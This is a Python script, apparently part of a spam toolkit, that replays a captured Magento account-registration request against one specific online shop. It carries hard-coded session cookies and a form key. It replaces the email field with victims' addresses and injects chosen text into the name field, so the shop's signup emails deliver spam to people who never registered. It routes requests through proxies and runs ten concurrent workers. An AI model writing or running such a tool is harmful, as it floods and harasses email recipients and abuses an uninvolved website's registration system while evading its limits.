from os.path import basename

import requests

import module
from module import Spam

cookies = {
    'PHPSESSID': 'gcr3keph07il09ns62hadjhgkt',
    'form_key': 'GHMgduAQnr68IZbV',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    'mage-cache-sessid': 'true',
    'mage-messages': '',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'section_data_ids': '%7B%22messages%22%3Anull%2C%22customer%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22cart%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22loggedAsCustomer%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D',
}

headers = {
    'authority': 'c-1187.maxcluster.net',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryzec1724jV0sAg9vE',
    'origin': 'https://c-1187.maxcluster.net',
    'referer': 'https://c-1187.maxcluster.net/customer/account/create/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):
    def check_success(self, response: requests.Response | None) -> bool:
        return response.ok

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="form_key"\r\n\r\nGHMgduAQnr68IZbV\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="success_url"\r\n\r\n\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="error_url"\r\n\r\n\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="firstname"\r\n\r\ntest\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="lastname"\r\n\r\nlastname\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="is_subscribed"\r\n\r\n1\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="assistance_allowed_checkbox"\r\n\r\n1\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="assistance_allowed"\r\n\r\n2\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="password"\r\n\r\npG2uT3IzwB\r\n------WebKitFormBoundaryzec1724jV0sAg9vE\r\nContent-Disposition: form-data; name="password_confirmation"\r\n\r\npG2uT3IzwB\r\n------WebKitFormBoundaryzec1724jV0sAg9vE--\r\n'
        text = self.get_text(False)
        data = data.replace('wezxasqw@gmail.com', target.replace('@', f'+{module.generate_text()}@')).replace('test',
                                                                                                              text)
        response = requests.post('https://c-1187.maxcluster.net/customer/account/createpost/', cookies=cookies,
                                 headers=headers, data=data.encode(), proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'Registrierte Kunden', target_pool_name='fkasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)


if __name__ == '__main__':
    main()
